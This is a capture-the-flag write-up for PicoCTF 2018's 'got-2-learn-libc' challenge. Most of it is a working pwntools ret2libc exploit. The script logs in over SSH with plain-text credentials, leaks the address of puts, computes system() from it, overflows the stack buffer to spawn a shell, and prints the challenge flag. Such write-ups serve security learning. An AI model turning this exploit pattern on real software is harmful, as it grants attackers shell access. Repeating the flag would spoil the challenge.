#  PicoCTF 2018 - got-2-learn-libc

got-2-learn-libc was a Binary Exploitation challenge in the 2018 PicoCTF. 

The challenge required us to leverage a ret2libc attack to exploit the Stack Buffer Overflow in the program. 

### Exploit:

```
#!/usr/bin/python
 
#----------------------------------------------------#
# PicoCTF 2018 - got-2-learn-libc - Points: 250      #
# Author: Bengman                                    #
#                                                    #
# Vulnerability: Stack based buffer overflow         #
#                                                    #
# Arch:     i386-32-little                           #
# RELRO:    Partial RELRO                            #
# Stack:    No canary found                          #
# NX:       NX enabled                               #
# PIE:      PIE enabled                              #
#----------------------------------------------------#
# [+] Connecting to 2018shell1.picoctf.com on port 22#
# [*] Working directory: '/problems/got-2-learn-...  #
# [*] Ret overwrite at offset: 160                   #
# [*] Puts located at: 0xf75e5140                    #
# [*] bin/sh located at: 0x56655030                  #
# [*] System located at: 0xf75c0940                  #
# [*] Switching to interactive mode                  #
# $ cat flag.txt                                     #
# picoCTF{syc4al1s_4rE_uS3fUl_bd99244d}              #
#                                                    #
#----------------------------------------------------#
from pwn import *

host = '2018shell1.picoctf.com'
user = 'bengman'
password = 'SuperSecretPicoPassword'

# Connect to challenge
s = ssh(host=host, user=user, password=password)
s.set_working_directory("/problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee")
p = s.process("./vuln")


# Crash:
#--------------------------------------------------------------------
# [#0] Id 1, Name: "vuln", stopped, reason: SIGSEGV
# 0x62616170 in ?? ()
#--------------------------------------------------------------------
ret_offset = cyclic_find(0x62616170)
log.info("Ret overwrite at offset: %s", ret_offset)

# Fetch addresses from application output
data = p.recvuntil('Enter a string:').split('\n')

puts_addr = int(data[2].split(':')[1].strip()[2:], 16)
log.info("Puts located at: 0x{:x}".format(puts_addr))

shell_addr = int(data[6].split(':')[1].strip()[2:], 16)
log.info("bin/sh located at: 0x{:x}".format(shell_addr))

# The address of System() will move around due to PIE, but it will always
# be at the same place relative to puts() in libc.
# So by calculating that offset we can get the address of system at runtime. 
#--------------------------------------------------------------------
# (gdb) p system                                                                                                
# $1 = {<text variable, no debug info>} 0xf75fa940 <system>                                                     
# (gdb) p puts                                                                                                  
# $2 = {<text variable, no debug info>} 0xf761f140 <puts>
#
# f75fa940-f761f140 = -24800 (-149504 decimal)
#--------------------------------------------------------------------
system_offset = -149504

system_addr = puts_addr + system_offset
log.info("System located at: 0x{:x}".format(system_addr))

# Crafting ret2libc payload
#--------------------------------------------------------------------
# JUNK + address to system() + address to exit() + address to /bin/sh
#--------------------------------------------------------------------
payload = ""
payload += "A"*ret_offset
payload += p32(system_addr)
payload += "B"*4
payload += p32(shell_addr)

p.sendline(payload)
p.interactive()
```
